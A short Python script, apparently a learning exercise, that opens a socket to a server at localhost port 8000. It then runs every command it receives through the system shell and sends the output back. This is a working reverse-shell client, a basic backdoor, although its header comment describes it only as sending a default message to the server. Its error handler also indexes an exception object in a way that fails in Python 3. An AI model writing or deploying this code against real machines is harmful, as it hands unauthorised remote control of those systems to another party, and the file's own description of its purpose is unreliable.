# Client file
# Estabishes connection and sends default message to server

import socket
import sys
import subprocess

# variables
ip = '127.0.0.1' # server IP address, localhost
port = 8000 # Communication port
buffer_size = 1024

# establish connection
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except OSError as e:
    print('[-] Error creating socket: ' + str(e[0]) + ' - ' + e[1])
    sys.exit();

s.connect((ip, port))

while True:
    command = s.recv(buffer_size)
    if 'exit' == command.decode():
        s.close()
        break
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send(CMD.stdout.read())
        s.send(CMD.stderr.read())